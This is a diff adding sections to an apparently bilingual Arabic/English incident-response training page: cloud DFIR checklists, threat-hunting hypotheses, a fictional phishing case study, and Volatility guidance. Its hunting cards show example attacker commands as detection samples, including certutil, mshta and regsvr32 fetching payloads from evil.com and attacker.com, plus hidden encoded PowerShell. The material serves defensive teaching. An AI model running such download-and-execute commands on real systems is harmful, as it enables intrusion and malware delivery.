+     'CreateAccessKey \u2014 \u0645\u0641\u062a\u0627\u062d \u062c\u062f\u064a\u062f \u063a\u064a\u0631 \u0645\u062a\u0648\u0642\u0639',
+     'CreateUser \u2014 \u0625\u0646\u0634\u0627\u0621 \u062d\u0633\u0627\u0628 IAM \u062c\u062f\u064a\u062f',
+     'AttachUserPolicy \u2014 \u0625\u0636\u0627\u0641\u0629 \u0635\u0644\u0627\u062d\u064a\u0627\u062a',
+     'AssumeRole \u2014 \u0645\u0646 \u0623\u064a Role \u0644\u0645\u0627\u0630\u0627',
+     'PutBucketPolicy / GetObject \u2014 \u0641\u062d\u0635 S3 access',
+     'AuthorizeSecurityGroupIngress \u2014 \u0641\u062a\u062d \u0645\u0646\u0627\u0641\u0630 \u062c\u062f\u064a\u062f\u0629',
+     'StopLogging / DeleteTrail \u2014 \u0639\u0644\u0627\u0645\u0629 \u062e\u0637\u0631\u0629 \u062c\u062f\u0627\u064b \u2014 Anti-forensics',
+     '\u0646\u0634\u0627\u0637 \u0645\u0646 \u0645\u0646\u0627\u0637\u0642 \u063a\u064a\u0631 \u0645\u0639\u062a\u0627\u062f\u0629',
+   ],
+   stepsEn:[
+     'ConsoleLogin \u2014 who logged in and from where',
+     'Check failed logins \u2014 brute-force indicators',
+     'CreateAccessKey \u2014 unexpected new access key',
+     'CreateUser \u2014 new IAM user created',
+     'AttachUserPolicy \u2014 policy permission added',
+     'AssumeRole \u2014 which role and why',
+     'PutBucketPolicy / GetObject \u2014 check S3 bucket access',
+     'AuthorizeSecurityGroupIngress \u2014 new ports opened',
+     'StopLogging / DeleteTrail \u2014 critical anti-forensics signal',
+     'Activity from unusual regions',
+   ],
+   questions:[
+     {ar:'\u0647\u0644 \u062a\u0645 \u0625\u0646\u0634\u0627\u0621 \u062d\u0633\u0627\u0628 IAM \u062c\u062f\u064a\u062f\u061f',en:'Was a new IAM user created?'},
+     {ar:'\u0647\u0644 \u062a\u0645 \u0625\u0646\u0634\u0627\u0621 Access Key\u061f',en:'Was an access key created?'},
+     {ar:'\u0647\u0644 \u062a\u0645 \u062a\u063a\u064a\u064a\u0631 Policy\u061f',en:'Were policies modified?'},
+     {ar:'\u0647\u0644 \u062a\u0645 \u0648\u0642\u0641 CloudTrail\u061f',en:'Was CloudTrail stopped?'},
+     {ar:'\u0647\u0644 \u062a\u0645 \u0627\u0644\u0648\u0635\u0648\u0644 \u0644\u0640 S3 buckets\u061f',en:'Were S3 buckets accessed?'},
+     {ar:'\u0647\u0644 \u064a\u0648\u062c\u062f \u0646\u0634\u0627\u0637 \u0645\u0646 \u0645\u0646\u0637\u0642\u0629 \u063a\u064a\u0631 \u0645\u0639\u062a\u0627\u062f\u0629\u061f',en:'Any activity from unusual regions?'},
+   ]
+  },
+];
+
+function bCloudDFIR(){
+  var C=document.getElementById('cloud-dfir-grid');
+  if(!C)return;
+  CLOUD_PANELS.forEach(function(panel){
+    var el=document.createElement('div');el.className='tbox fade';
+    var steps=panel.stepsAr.map(function(s,i){return'<div class="cloud-step"><span class="cloud-step-n">'+(i+1)+'.</span><span><span class="ar">'+s+'</span><span class="en">'+panel.stepsEn[i]+'</span></span></div>';}).join('');
+    var qs=panel.questions.map(function(q){return'<div class="scope-q"><span class="ar">'+q.ar+'</span><span class="en">'+q.en+'</span></div>';}).join('');
+    el.innerHTML='<div class="tbox-hd" style="background:var(--'+panel.c+'l)">'
+      +'<div class="tbox-ic" style="background:var(--bg2);font-size:22px">'+panel.ic+'</div>'
+      +'<div><div class="tbox-title"><span class="ar">'+panel.titleAr+'</span><span class="en">'+panel.titleEn+'</span></div></div></div>'
+      +'<div class="tbox-body">'
+      +'<div class="cloud-steps" style="margin-bottom:1rem">'+steps+'</div>'
+      +'<div style="font-size:11px;font-weight:600;color:var(--text3);letter-spacing:.08em;text-transform:uppercase;margin-bottom:.5rem"><span class="ar">&#x0623;&#x0633;&#x0626;&#x0644;&#x0629; &#x0627;&#x0644;&#x062A;&#x062D;&#x0642;&#x064A;&#x0642;</span><span class="en">Investigation Questions</span></div>'
+      +'<div class="scope-list">'+qs+'</div>'
+      +'</div>';
+    C.appendChild(el);
+  });
+}
+
+// ── Threat Hunting Hypotheses ──
+var HUNTS=[
+  {badge:'H1',badgeC:'c2',
+   hypoAr:'&#x0627;&#x0644;&#x0645;&#x0647;&#x0627;&#x062C;&#x0645; &#x064A;&#x0633;&#x062A;&#x062E;&#x062F;&#x0645; Living off the Land &#x2014; &#x062A;&#x0646;&#x0641;&#x064A;&#x0630; payloads &#x0628;&#x0623;&#x062F;&#x0648;&#x0627;&#x062A; Windows &#x0627;&#x0644;&#x0634;&#x0631;&#x0639;&#x064A;&#x0629;',
+   hypoEn:'Attackers may use Living off the Land (LotL) binaries to download or execute payloads using trusted Windows tools',
+   items:[
+     {ar:'certutil \u064a\u062d\u0645\u0644 \u0645\u0644\u0641\u0627\u062a',en:'certutil downloading files',ex:'certutil.exe -urlcache -split -f http://evil.com/payload.exe'},
+     {ar:'mshta \u064a\u0634\u063a\u0651\u0644 \u0645\u062d\u062a\u0648\u0649 \u062e\u0627\u0631\u062c\u064a',en:'mshta executing remote content',ex:'mshta.exe http://attacker.com/payload.hta'},
+     {ar:'rundll32 \u064a\u062d\u0645\u0644 DLL \u0645\u0646 \u0645\u0633\u0627\u0631 \u063a\u064a\u0631 \u0637\u0628\u064a\u0639\u064a',en:'rundll32 loading DLL from unusual path',ex:'rundll32.exe C:\\Users\\Public\\file.dll,Start'},
+     {ar:'regsvr32 \u064a\u0646\u0641\u0630 scriptlets',en:'regsvr32 executing scriptlets',ex:'regsvr32.exe /s /u /i:http://attacker.com/file.sct scrobj.dll'},
+     {ar:'powershell \u0628\u0623\u0648\u0627\u0645\u0631 \u0645\u0634\u0641\u0651\u0631\u0629',en:'PowerShell encoded commands',ex:'powershell.exe -enc [base64] -WindowStyle Hidden'},
+   ]},
+  {badge:'H2',badgeC:'c3',
+   hypoAr:'&#x0627;&#x0644;&#x0645;&#x0647;&#x0627;&#x062C;&#x0645; &#x0623;&#x0646;&#x0634;&#x0623; Persistence &#x0639;&#x0628;&#x0631; Scheduled Tasks &#x0623;&#x0648; Services',
+   hypoEn:'Attackers may have created persistence using Scheduled Tasks or Windows Services',
+   items:[
+     {ar:'\u0645\u0647\u0627\u0645 \u0645\u062c\u062f\u0648\u0644\u0629 \u062c\u062f\u064a\u062f\u0629 \u0628\u0639\u062f \u0648\u0642\u062a \u0627\u0644\u062d\u0627\u062f\u062b\u0629',en:'New scheduled tasks after incident time',ex:'Event ID 4698 \u2014 Scheduled task created'},
+     {ar:'\u062e\u062f\u0645\u0629 \u062c\u062f\u064a\u062f\u0629 \u0628\u0645\u0633\u0627\u0631 \u0642\u0627\u0628\u0644 \u0644\u0644\u0643\u062a\u0627\u0628\u0629',en:'New service with binary in user-writable path',ex:'Event ID 7045 + path contains \\Users\\ or \\Temp\\'},
+     {ar:'\u0645\u0647\u0645\u0629 \u062a\u0634\u063a\u0651\u0644 PowerShell \u0623\u0648 script',en:'Task running PowerShell or script file',ex:'schtasks /create /tr "powershell.exe -enc ..."'},
+   ]},
+  {badge:'H3',badgeC:'c4',
+   hypoAr:'&#x0627;&#x0644;&#x0645;&#x0647;&#x0627;&#x062C;&#x0645; &#x0627;&#x0633;&#x062A;&#x062E;&#x062F;&#x0645; &#x062D;&#x0633;&#x0627;&#x0628;&#x0627;&#x062A; &#x0635;&#x062D;&#x064A;&#x062D;&#x0629; &#x0644;&#x0644;&#x062A;&#x062D;&#x0631;&#x0643; &#x0628;&#x064A;&#x0646; &#x0627;&#x0644;&#x0623;&#x0646;&#x0638;&#x0645;&#x0629; (Lateral Movement)',
+   hypoEn:'Attackers may have used valid accounts for lateral movement across systems',
+   items:[
+     {ar:'4624 Type 3 \u0623\u0648 10 \u2014 \u062f\u062e\u0648\u0644 \u0639\u0628\u0631 \u0627\u0644\u0634\u0628\u0643\u0629 \u0623\u0648 RDP',en:'Event 4624 Type 3 (network) or Type 10 (RDP)',ex:'Filter: Logon Type=3, same user on multiple hosts'},
+     {ar:'4672 \u2014 \u062f\u062e\u0648\u0644 \u0628\u0635\u0644\u0627\u062d\u064a\u0627\u062a \u0639\u0627\u0644\u064a\u0629',en:'Event 4672 \u2014 privileged logon',ex:'Admin account used on non-admin workstation'},
+     {ar:'PsExec \u0623\u0648 WMI \u0645\u0646 \u0645\u0636\u064a\u0641 \u063a\u064a\u0631 \u0645\u062a\u0648\u0642\u0639',en:'PsExec or WMI from unexpected source',ex:'PSEXESVC service (Event 7045) on target host'},
+     {ar:'SMB admin share access \u2014 \u0644\u0644\u0648\u0635\u0648\u0644 \u0644\u0640 C$',en:'SMB admin share access to C$',ex:'4624 + Share=C$ from internal IP'},
+   ]},
+];
+
+function bHunting(){
+  var C=document.getElementById('hunting-cards');
+  if(!C)return;
+  HUNTS.forEach(function(h){
+    var el=document.createElement('div');el.className='hunt-card fade';
+    var items=h.items.map(function(item){return'<div class="hunt-item"><div><span class="ar">'+item.ar+'</span><span class="en">'+item.en+'</span><div class="code-block" style="margin-top:5px;font-size:10px;padding:5px 9px">'+item.ex+'</div></div></div>';}).join('');
+    el.innerHTML='<div class="hunt-hd" style="background:var(--'+h.badgeC+'l)">'
+      +'<span class="hunt-badge" style="background:var(--'+h.badgeC+');color:#fff">'+h.badge+'</span>'
+      +'<div class="hunt-title"><span class="ar">'+h.hypoAr+'</span><span class="en">'+h.hypoEn+'</span></div></div>'
+      +'<div class="hunt-body"><div class="hunt-hypo" style="display:none"></div><div class="hunt-items">'+items+'</div></div>';
+    C.appendChild(el);
+  });
+}
+
+// ── Case Study ──
+var CASE_TIMELINE=[
+  {time:'10:05 UTC',evAr:'\u0645\u0633\u062a\u062e\u062f\u0645 \u0641\u062a\u062d \u0645\u0631\u0641\u0642 \u0628\u0631\u064a\u062f \u0625\u0644\u0643\u062a\u0631\u0648\u0646\u064a',evEn:'User opened email attachment',src:'Email / LNK file',intAr:'\u0628\u062f\u0627\u064a\u0629 \u0627\u0644\u062a\u0646\u0641\u064a\u0630',intEn:'Initial access via phishing'},
+  {time:'10:06 UTC',evAr:'winword.exe \u0634\u063a\u0651\u0644 powershell.exe',evEn:'winword.exe launched powershell.exe',src:'Event ID 4688 / Sysmon 1',intAr:'Parent process \u0645\u0634\u0628\u0648\u0647 \u2014 Macro execution',intEn:'Suspicious parent-child \u2014 Macro execution'},
+  {time:'10:07 UTC',evAr:'PowerShell \u0627\u062a\u0635\u0644 \u0628\u0640 IP \u062e\u0627\u0631\u062c\u064a',evEn:'PowerShell connected to external IP',src:'Firewall / Sysmon 3',intAr:'\u0627\u062d\u062a\u0645\u0627\u0644 C2 \u2014 Cobalt Strike or similar',intEn:'Likely C2 communication'},
+  {time:'10:09 UTC',evAr:'\u0625\u0646\u0634\u0627\u0621 Scheduled Task \u062c\u062f\u064a\u062f',evEn:'Scheduled task created',src:'Event ID 4698',intAr:'\u0627\u0633\u062a\u0645\u0631\u0627\u0631\u064a\u0629 \u2014 Persistence established',intEn:'Persistence mechanism installed'},
+  {time:'10:15 UTC',evAr:'\u0639\u0632\u0644 \u0627\u0644\u062c\u0647\u0627\u0632 \u0639\u0628\u0631 EDR',evEn:'Host isolated via EDR',src:'EDR action',intAr:'\u0627\u062d\u062a\u0648\u0627\u0621 \u2014 Containment complete',intEn:'Containment complete'},
+];
+
+var CASE_IOCS=[
+  {type:'SHA256',val:'3a7f9b2c...d4e1f (malicious Word document)'},
+  {type:'IP (C2)',val:'185.220.x.x:443 (Cobalt Strike beacon)'},
+  {type:'Domain',val:'updates-cdn[.]net (C2 domain)'},
+  {type:'Sched. Task',val:'\\Microsoft\\Windows\\Update\\SvcTask'},
+  {type:'MITRE',val:'T1566.001 | T1059.001 | T1053.005 | T1071.001'},
+];
+
+function bCaseStudy(){
+  var C=document.getElementById('case-study-body');
+  if(!C)return;
+
+  // Scenario card
+  var scen=document.createElement('div');scen.className='tbox fade';scen.style.marginBottom='1.2rem';
+  scen.innerHTML='<div class="tbox-hd" style="background:var(--c4l)">'
+    +'<div class="tbox-ic" style="background:var(--bg2)">&#x1F6A8;</div>'
+    +'<div><div class="tbox-title"><span class="ar">&#x0627;&#x0644;&#x0633;&#x064A;&#x0646;&#x0627;&#x0631;&#x064A;&#x0648;</span><span class="en">Scenario</span></div>'
+    +'<div class="tbox-sub">Suspicious PowerShell Execution After Phishing Email</div></div></div>'
+    +'<div class="tbox-body"><p style="font-size:13px;color:var(--text2);line-height:1.75">'
+    +'<span class="ar">&#x062A;&#x0646;&#x0628;&#x064A;&#x0647; SIEM: &#x062A;&#x0634;&#x063A;&#x064A;&#x0644; PowerShell &#x0628;&#x0623;&#x0645;&#x0631; &#x0645;&#x0634;&#x0641;&#x0651;&#x0631;. &#x0627;&#x0644;&#x0645;&#x0633;&#x062A;&#x062E;&#x062F;&#x0645;: john.smith &#x0639;&#x0644;&#x0649; WS-001. &#x0627;&#x0644;&#x0645;&#x062E;&#x062A;&#x0628;&#x0631; &#x0627;&#x0644;&#x0648;&#x0647;&#x0645;&#x064A; &#x2014; &#x0644;&#x0627; &#x064A;&#x062D;&#x062A;&#x0648;&#x064A; &#x0639;&#x0644;&#x0649; &#x0628;&#x064A;&#x0627;&#x0646;&#x0627;&#x062A; &#x062D;&#x0642;&#x064A;&#x0642;&#x064A;&#x0629;.</span>'
+    +'<span class="en">SIEM alert: PowerShell encoded command execution. User: john.smith on WS-001. This is a fictional lab scenario \u2014 no real data.</span></p></div>';
+  C.appendChild(scen);
+
+  // Steps
+  var steps=[
+    {ar:'\u0627\u0633\u062a\u0644\u0627\u0645 \u0627\u0644\u062a\u0646\u0628\u064a\u0647 \u0648\u062a\u062d\u062f\u064a\u062f \u0631\u0642\u0645 \u0627\u0644\u062d\u0627\u0644\u0629',en:'Receive alert, assign Case ID, log UTC time'},
+    {ar:'\u062a\u062d\u062f\u064a\u062f \u0627\u0644\u062c\u0647\u0627\u0632 (WS-001) \u0648\u0627\u0644\u0645\u0633\u062a\u062e\u062f\u0645 (john.smith)',en:'Identify host WS-001 and user john.smith'},
+    {ar:'\u0645\u0631\u0627\u062c\u0639\u0629 Event ID 4688 \u2014 \u0634\u062c\u0631\u0629 \u0627\u0644\u0639\u0645\u0644\u064a\u0627\u062a',en:'Review Event ID 4688 \u2014 process tree'},
+    {ar:'\u0627\u0643\u062a\u0634\u0627\u0641 winword.exe \u0634\u063a\u0651\u0644 powershell.exe',en:'Find winword.exe launched powershell.exe'},
+    {ar:'\u0641\u0643 \u062a\u0634\u0641\u064a\u0631 base64 \u0648\u0641\u062d\u0635 \u0627\u0644\u0623\u0645\u0631',en:'Decode base64 command, inspect payload'},
+    {ar:'\u0641\u062d\u0635 Sysmon Event 3 \u2014 \u0627\u062a\u0635\u0627\u0644 \u062e\u0627\u0631\u062c\u064a',en:'Check Sysmon Event 3 \u2014 external connection from powershell.exe'},
+    {ar:'\u062a\u062d\u062f\u064a\u062f IP \u0627\u0644\u062e\u0627\u0631\u062c\u064a (C2) \u0648\u0641\u062d\u0635 \u0633\u0645\u0639\u062a\u0647',en:'Identify external C2 IP, check reputation on AbuseIPDB'},
+    {ar:'\u0641\u062d\u0635 Event ID 4698 \u2014 Scheduled Task \u062c\u062f\u064a\u062f',en:'Find Event ID 4698 \u2014 persistence via scheduled task'},
+    {ar:'\u0628\u0646\u0627\u0621 \u0627\u0644\u062e\u0637 \u0627\u0644\u0632\u0645\u0646\u064a (UTC)',en:'Build timeline (all timestamps in UTC)'},
+    {ar:'\u0627\u0633\u062a\u062e\u0631\u0627\u062c IOCs \u0648\u0631\u0628\u0637\u0647\u0627 \u0628\u0640 MITRE ATT&CK',en:'Extract IOCs and map to MITRE ATT&CK'},
+    {ar:'\u0639\u0632\u0644 \u0627\u0644\u062c\u0647\u0627\u0632 \u0639\u0628\u0631 EDR',en:'Isolate host via EDR'},
+    {ar:'\u0625\u0639\u0627\u062f\u0629 \u062a\u0639\u064a\u064a\u0646 \u0628\u064a\u0627\u0646\u0627\u062a \u0627\u0639\u062a\u0645\u0627\u062f \u0627\u0644\u0645\u0633\u062a\u062e\u062f\u0645 \u0648\u0643\u062a\u0627\u0628\u0629 \u0627\u0644\u062a\u0642\u0631\u064a\u0631',en:'Reset user credentials, write incident report'},
+  ];
+  var stepsCard=document.createElement('div');stepsCard.className='tbox fade';stepsCard.style.marginBottom='1.2rem';
+  stepsCard.innerHTML='<div class="tbox-hd" style="background:var(--c2l)">'
+    +'<div class="tbox-ic" style="background:var(--bg2)">&#x1F4CB;</div>'
+    +'<div class="tbox-title"><span class="ar">&#x062E;&#x0637;&#x0648;&#x0627;&#x062A; &#x0627;&#x0644;&#x062A;&#x062D;&#x0642;&#x064A;&#x0642;</span><span class="en">Investigation Steps</span></div></div>'
+    +'<div class="tbox-body"><div class="pb-steps">'
+    +steps.map(function(s,i){return'<div class="pb-step"><span class="pb-sn">'+(i+1)+'.</span><span><span class="ar">'+s.ar+'</span><span class="en">'+s.en+'</span></span></div>';}).join('')
+    +'</div></div>';
+  C.appendChild(stepsCard);
+
+  // Timeline table
+  var timelineCard=document.createElement('div');timelineCard.className='tbox fade';timelineCard.style.marginBottom='1.2rem';
+  timelineCard.innerHTML='<div class="tbox-hd" style="background:var(--c3l)">'
+    +'<div class="tbox-ic" style="background:var(--bg2)">&#x1F4C5;</div>'
+    +'<div class="tbox-title"><span class="ar">&#x0627;&#x0644;&#x062E;&#x0637; &#x0627;&#x0644;&#x0632;&#x0645;&#x0646;&#x064A; (UTC)</span><span class="en">Timeline (UTC)</span></div></div>'
+    +'<div class="tbox-body"><div class="dfir-table-hint">&#x2194;&#xFE0F; Swipe to view</div>'
+    +'<div class="dfir-table-wrap"><table class="case-timeline-table"><thead><tr>'
+    +'<th>Time UTC</th><th><span class="ar">&#x0627;&#x0644;&#x062D;&#x062F;&#x062B;</span><span class="en">Evidence</span></th><th>Source</th><th><span class="ar">&#x0627;&#x0644;&#x062A;&#x0641;&#x0633;&#x064A;&#x0631;</span><span class="en">Interpretation</span></th>'
+    +'</tr></thead><tbody>'
+    +CASE_TIMELINE.map(function(r){return'<tr>'
+      +'<td><span class="evt-time">'+r.time+'</span></td>'
+      +'<td><span class="ar">'+r.evAr+'</span><span class="en">'+r.evEn+'</span></td>'
+      +'<td><span class="evt-src">'+r.src+'</span></td>'
+      +'<td><span class="ar">'+r.intAr+'</span><span class="en">'+r.intEn+'</span></td>'
+      +'</tr>';}).join('')
+    +'</tbody></table></div></div>';
+  C.appendChild(timelineCard);
+
+  // IOCs
+  var iocCard=document.createElement('div');iocCard.className='tbox fade';iocCard.style.marginBottom='1.2rem';
+  iocCard.innerHTML='<div class="tbox-hd" style="background:var(--c4l)">'
+    +'<div class="tbox-ic" style="background:var(--bg2)">&#x1F3AF;</div>'
+    +'<div class="tbox-title">IOCs</div></div>'
+    +'<div class="tbox-body"><div class="item-list">'
+    +CASE_IOCS.map(function(ioc){return'<div class="item warn"><div class="item-dot dot-warn"></div>'
+      +'<div><span class="item-cmd">'+ioc.type+'</span> <span style="font-size:12px;color:var(--text2)">'+ioc.val+'</span></div></div>';}).join('')
+    +'</div></div>';
+  C.appendChild(iocCard);
+
+  // Conclusion
+  var concl=document.createElement('div');concl.className='fade';
+  concl.innerHTML='<div style="padding:1.2rem 1.4rem;background:var(--c1l);border:1px solid var(--c1b);border-radius:12px;font-size:13px;color:var(--text2);line-height:1.85">'
+    +'<strong style="color:var(--c1);display:block;margin-bottom:6px">&#x2705; <span class="ar">&#x0627;&#x0644;&#x0627;&#x0633;&#x062A;&#x0646;&#x062A;&#x0627;&#x062C;</span><span class="en">Conclusion</span></strong>'
+    +'<span class="ar">&#x063A;&#x0627;&#x0644;&#x0628;&#x064B;&#x0627; &#x0628;&#x062F;&#x0623; &#x0627;&#x0644;&#x062D;&#x0627;&#x062F;&#x062B; &#x0645;&#x0646; &#x0645;&#x0631;&#x0641;&#x0642; &#x062A;&#x0635;&#x064A;&#x062F;. &#x0627;&#x0633;&#x062A;&#x062E;&#x062F;&#x0645; &#x0627;&#x0644;&#x0645;&#x0647;&#x0627;&#x062C;&#x0645; PowerShell &#x0644;&#x0644;&#x062A;&#x0646;&#x0641;&#x064A;&#x0630;&#x060C; &#x062B;&#x0645; &#x062A;&#x0648;&#x0627;&#x0635;&#x0644; &#x0645;&#x0639; IP &#x062E;&#x0627;&#x0631;&#x062C;&#x064A; (C2)&#x060C; &#x0648;&#x0623;&#x0646;&#x0634;&#x0623; Scheduled Task &#x0644;&#x0644;&#x0627;&#x0633;&#x062A;&#x0645;&#x0631;&#x0627;&#x0631;&#x064A;&#x0629;. &#x064A;&#x062C;&#x0628; &#x0639;&#x0632;&#x0644; &#x0627;&#x0644;&#x062C;&#x0647;&#x0627;&#x0632;&#x060C; &#x0625;&#x0639;&#x0627;&#x062F;&#x0629; &#x062A;&#x0639;&#x064A;&#x064A;&#x0646; &#x0628;&#x064A;&#x0627;&#x0646;&#x0627;&#x062A; &#x0627;&#x0644;&#x0627;&#x0639;&#x062A;&#x0645;&#x0627;&#x062F;&#x060C; &#x0648;&#x0627;&#x0644;&#x0628;&#x062D;&#x062B; &#x0639;&#x0646; &#x0646;&#x0641;&#x0633; &#x0627;&#x0644;&#x0645;&#x0624;&#x0634;&#x0631;&#x0627;&#x062A; &#x0641;&#x064A; &#x0628;&#x0627;&#x0642;&#x064A; &#x0627;&#x0644;&#x0628;&#x064A;&#x0626;&#x0629;.</span>'
+    +'<span class="en">The incident likely started from a phishing attachment. The attacker used PowerShell for execution, connected to an external C2 IP, and created a scheduled task for persistence. The host should be isolated, user credentials reset, and IOCs searched across the environment.</span>'
+    +'</div>';
+  C.appendChild(concl);
+}
+
+// ── Volatility output interpretation ──
+function addVolatilityInterp(){
+  var advC=document.getElementById('adv-c');
+  if(!advC)return;
+  var card=document.createElement('div');card.className='adv-card fade';
+  var sampleTree=
+    'System (PID 4)\n'
+    +'smss.exe\n'
+    +' \u2514\u2500\u2500 csrss.exe\n'
+    +' \u2514\u2500\u2500 wininit.exe\n'
+    +'     \u2514\u2500\u2500 services.exe\n'
+    +'         \u2514\u2500\u2500 svchost.exe  \u2713 Normal\n'
+    +'winword.exe\n'
+    +' \u2514\u2500\u2500 powershell.exe  \u26A0 SUSPICIOUS\n'
+    +'     \u2514\u2500\u2500 rundll32.exe   \u274C LIKELY PAYLOAD';
+  var pluginTable=[
+    {plug:'windows.pstree',lookAr:'\u0639\u0644\u0627\u0642\u0629 Parent-Child',lookEn:'Parent-child relationship',exAr:'winword.exe \u2192 powershell.exe',exEn:'winword.exe \u2192 powershell.exe'},
+    {plug:'windows.cmdline',lookAr:'\u0627\u0644\u0623\u0645\u0631 \u0627\u0644\u0643\u0627\u0645\u0644',lookEn:'Full command line executed',exAr:'powershell -enc [base64]',exEn:'powershell -enc [base64]'},
+    {plug:'windows.netscan',lookAr:'\u0627\u062a\u0635\u0627\u0644\u0627\u062a \u0634\u0628\u0643\u064a\u0629',lookEn:'Network connections',exAr:'\u0639\u0645\u0644\u064a\u0629 \u063a\u064a\u0631 \u0645\u0639\u0631\u0648\u0641\u0629 \u062a\u062a\u0635\u0644 \u0628\u0640 IP \u062e\u0627\u0631\u062c\u064a',exEn:'Unknown process connected to rare external IP'},
+    {plug:'windows.dlllist',lookAr:'DLLs \u0645\u062d\u0645\u0644\u0629',lookEn:'Loaded DLLs',exAr:'DLL \u0645\u0646 \u0645\u062c\u0644\u062f Temp',exEn:'DLL loaded from \\Temp\\ folder'},
+    {plug:'windows.psscan',lookAr:'\u0639\u0645\u0644\u064a\u0627\u062a \u0645\u062e\u0641\u064a\u0629',lookEn:'Hidden or terminated processes',exAr:'\u0645\u0648\u062c\u0648\u062f\u0629 \u0641\u064a psscan \u0644\u0643\u0646 \u0644\u064a\u0633 \u0641\u064a pslist',exEn:'Exists in psscan but not in pslist'},
+  ];
+  card.innerHTML='<div style="font-size:22px;margin-bottom:.5rem">&#x1F4BE;</div>'
+    +'<div class="adv-title" style="color:var(--c3)"><span class="ar">&#x0643;&#x064A;&#x0641; &#x062A;&#x0642;&#x0631;&#x0623; &#x0645;&#x062E;&#x0631;&#x062C;&#x0627;&#x062A; Volatility</span><span class="en">How to Read Volatility Output</span></div>'
+    +'<div class="adv-desc" style="margin-bottom:.75rem"><span class="ar">&#x0644;&#x0627; &#x062A;&#x062D;&#x0643;&#x0645; &#x0645;&#x0646; &#x0627;&#x0633;&#x0645; &#x0627;&#x0644;&#x0639;&#x0645;&#x0644;&#x064A;&#x0629; &#x0641;&#x0642;&#x0637; &#x2014; &#x0627;&#x0641;&#x062D;&#x0635; &#x0627;&#x0644;&#x0623;&#x0645;&#x0631;\u060c &#x0627;&#x0644;&#x0627;&#x062A;&#x0635;&#x0627;&#x0644;&#x060c; &#x0648;&#x0627;&#x0644;&#x0639;&#x0645;&#x0644;&#x064A;&#x0629; &#x0627;&#x0644;&#x0623;&#x0645;.</span><span class="en">Don\'t judge by process name alone \u2014 check command line, parent, and network.</span></div>'
+    +'<div class="vol-output">'+sampleTree.replace(/⚠/g,'\u26a0').replace(/✓/g,'\u2713').replace(/❌/g,'\u274c')+'</div>'
+    +'<div class="dfir-table-wrap"><table class="dfir-table"><thead><tr><th>Plugin</th><th><span class="ar">&#x0645;&#x0627;&#x0630;&#x0627; &#x062A;&#x0628;&#x062D;&#x062B;</span><span class="en">What to Look For</span></th><th><span class="ar">&#x0645;&#x062B;&#x0627;&#x0644; &#x0645;&#x0634;&#x0628;&#x0648;&#x0647;</span><span class="en">Suspicious Example</span></th></tr></thead><tbody>'
+    +pluginTable.map(function(r){return'<tr><td style="font-family:\'JetBrains Mono\',monospace;font-size:11px;color:var(--c2)">'+r.plug+'</td><td><span class="ar">'+r.lookAr+'</span><span class="en">'+r.lookEn+'</span></td><td style="font-family:\'JetBrains Mono\',monospace;font-size:11px;color:var(--c4)"><span class="ar">'+r.exAr+'</span><span class="en">'+r.exEn+'</span></td></tr>';}).join('')
+    +'</tbody></table></div>';
+  advC.appendChild(card);
+}
+
+// ── INIT ──
+bLinuxMac();
+bCloudDFIR();
+bHunting();
+bCaseStudy();
+setTimeout(addVolatilityInterp, 400);
+
 window.addEventListener('scroll',function(){
   var btt=document.getElementById('btt');
   if(btt){btt.classList.toggle('show',window.scrollY>400);}
@@ -2800,6 +3279,10 @@ setTimeout(attachCopyBtns,800);
         <a href="#playbooks" class="mob-na" onclick="closeMobMenu()"><span class="mob-na-num">13</span> <span class="ari">&#x062E;&#x0637;&#x0637;</span><span class="eni">Playbooks</span></a>
         <a href="#eventids" class="mob-na" onclick="closeMobMenu()"><span class="mob-na-num">14</span> Event IDs</a>
         <a href="#advanced" class="mob-na" onclick="closeMobMenu()"><span class="mob-na-num">15</span> <span class="ari">&#x0645;&#x062A;&#x0642;&#x062F;&#x0645;</span><span class="eni">Advanced</span></a>
+        <a href="#linux-mac" class="mob-na" onclick="closeMobMenu()"><span class="mob-na-num">18</span> Linux/macOS</a>
+        <a href="#cloud-dfir" class="mob-na" onclick="closeMobMenu()"><span class="mob-na-num">19</span> Cloud DFIR</a>
+        <a href="#threat-hunting-lab" class="mob-na" onclick="closeMobMenu()"><span class="mob-na-num">20</span> <span class="ari">&#x0635;&#x064A;&#x062F;</span><span class="eni">Hunting</span></a>
+        <a href="#case-study" class="mob-na" onclick="closeMobMenu()"><span class="mob-na-num">21</span> <span class="ari">&#x062F;&#x0631;&#x0627;&#x0633;&#x0629;</span><span class="eni">Case Study</span></a>
         <a href="#reporting" class="mob-na" onclick="closeMobMenu()"><span class="mob-na-num">16</span> <span class="ari">&#x062A;&#x0642;&#x0627;&#x0631;&#x064A;&#x0631;</span><span class="eni">Reporting</span></a>
         <a href="#references" class="mob-na" onclick="closeMobMenu()"><span class="mob-na-num">&#x1F4DA;</span> <span class="ari">&#x0645;&#x0631;&#x0627;&#x062C;&#x0639;</span><span class="eni">References</span></a>
       </div>
